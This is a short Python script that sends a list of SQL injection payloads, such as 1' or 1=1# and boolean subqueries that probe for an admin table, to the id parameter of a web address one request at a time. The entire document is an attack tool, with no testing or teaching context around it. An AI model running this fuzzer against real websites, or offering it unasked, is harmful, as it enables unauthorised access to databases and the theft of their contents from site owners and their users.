import requests
from time import sleep
from urllib import quote

payload = [

    "1' or 1=1#", 
    "1' or 1=1%23", 
    "1' or '1",
    "1 or exists(select admin from admin)",
    "1 or exists(select root from admin)", 

]



for i in payload:
    r = requests.get('http://test.com/?id=' + quote(i) )
    print (i)
    sleep(0.5)